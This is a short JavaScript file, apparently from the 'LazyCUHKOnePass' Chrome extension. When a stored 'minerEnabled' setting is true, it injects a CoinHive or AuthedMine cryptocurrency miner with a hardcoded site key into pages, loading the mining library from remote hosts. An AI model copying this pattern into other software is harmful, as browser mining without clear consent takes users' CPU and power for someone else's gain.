const COIN_HIVE_SITE_KEY = 'I2z6pueJaeVCz5dh1uA8cru5Fl108DtH';
const COIN_HIVE_SITE_USER = 'LazyCUHKOnePassTesting1';

function startMiner() {
  const head = document.getElementsByTagName('head')[0];

  const script = document.createElement('script');
  const actualCode = "var miner = new CoinHive.User('" + COIN_HIVE_SITE_KEY + "', '" + COIN_HIVE_SITE_USER + "', {" +
    "autoThreads: true," +
    "throttle: 0.6," +
    "});" +
    "miner.start();";
  script.textContent = actualCode;

  head.appendChild(script);
}

function loadScript(url, onSuccess, onError) {
  const head = document.getElementsByTagName('head')[0];

  const script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = url;
  script.onload = onSuccess;
  script.onerror = onError;

  head.appendChild(script);
}

function loadAndStartAuthedMine() {
  loadScript("https://authedmine.com/lib/authedmine.min.js",
    function() {
      startMiner();
    },
    function() {
      console.log('LazyCUHKOnePass: Unable to load miner library.');
    }
  );
}

function loadAndStartCoinHive() {
  loadScript("https://coinhive.com/lib/coinhive.min.js",
    function() {
      startMiner();
    },
    function() {
      loadAndStartAuthedMine();
    }
  );
}

chrome.storage.local.get("minerEnabled", function(config) {
console.log(config.minerEnabled);

  if (config.minerEnabled !== true) {
    return;
  }

  loadAndStartCoinHive();
});
